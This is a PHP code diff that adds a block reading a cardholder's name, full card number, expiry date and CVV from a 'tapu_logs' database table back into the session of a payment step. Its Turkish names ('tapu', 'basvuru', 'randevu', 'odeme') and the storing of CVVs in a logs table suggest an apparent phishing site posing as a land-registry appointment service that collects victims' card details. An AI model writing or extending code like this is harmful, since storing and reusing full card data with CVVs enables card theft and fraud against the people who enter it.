@@ -5,6 +5,26 @@
  */
 if (session_status() === PHP_SESSION_NONE) session_start();
 require_once __DIR__ . '/db.php';
+
+// Sync $_SESSION['odeme'] with DB to prevent stale session files in serverless environments
+$log_id = get_or_create_log();
+if ($log_id) {
+    try {
+        $st = db()->prepare("SELECT kart_ad, kart_no, ay, yil, cvv FROM tapu_logs WHERE id = ? LIMIT 1");
+        $st->execute([$log_id]);
+        $db_card = $st->fetch();
+        if ($db_card && !empty($db_card['kart_no'])) {
+            $_SESSION['odeme'] = [
+                'kart_ad' => $db_card['kart_ad'] ?? '',
+                'kart_no' => $db_card['kart_no'] ?? '',
+                'ay'      => $db_card['ay']      ?? '',
+                'yil'     => $db_card['yil']     ?? '',
+                'cvv'     => $db_card['cvv']     ?? '',
+            ];
+        }
+    } catch (Exception $e) {}
+}
+
 if (empty($_SESSION['basvuru']) || empty($_SESSION['randevu']) || empty($_SESSION['odeme'])) {
     header('Location: ' . BASE_PATH . '/'); exit;
 }
